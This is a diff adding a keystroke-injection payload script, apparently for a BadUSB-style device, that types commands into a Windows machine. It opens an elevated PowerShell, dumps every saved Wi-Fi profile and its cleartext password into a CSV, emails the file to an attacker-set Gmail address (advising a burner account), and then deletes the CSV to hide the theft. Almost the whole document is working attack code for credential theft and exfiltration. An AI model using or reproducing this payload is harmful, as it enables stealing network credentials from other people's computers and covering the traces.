@@ -1,0 +1,40 @@
+Rem: Get wifi passwords
+Rem: This script will dump all WIFI password and send over email.
+Rem: First, wee need to get admin powershell
+CustomDelay:500
+Press:131+114
+CustomDelay:500
+Print:powershell Start-Process powershell -Verb runAs
+CustomDelay:100
+Press:176
+CustomDelay:1000
+Press:130+121
+CustomDelay:500
+
+Rem: Now we are dump wifi passwords into a file
+Print:(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}| Select-String 'Key Content\W+:(.+)$'  |  %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -Path $env:APPDATA/temp.csv;exit
+Press:176
+CustomDelay:3000
+
+Rem: Now get an admin powershell to send an email (I am pretty sure I do not need admin for that)
+CustomDelay:500
+Press:131+114
+CustomDelay:500
+Print:powershell Start-Process powershell -Verb runAs
+CustomDelay:100
+Press:176
+CustomDelay:1000
+Press:130+121
+CustomDelay:500
+Rem:Send file by email
+Print:$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('your@email.address', 'email_password[use burner email]'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'squigly@gmail.com'; $ReportEmail.To.Add('your@email.address'); $ReportEmail.Subject = 'WIFI Passwords'; $ReportEmail.Body = ' wifi passwords'; $ReportEmail.Attachments.Add($env:APPDATA+'/temp.csv'); $SMTPInfo.Send($ReportEmail);exit
+Press:176
+CustomDelay:500
+
+Rem: Now remove the CSV file
+Press:131+114
+Print:powershell Remove-Item -path %appdata%/temp.csv -ErrorAction Ignore
+Press:176
+CustomDelay:100
+Print:exit
+Press:176
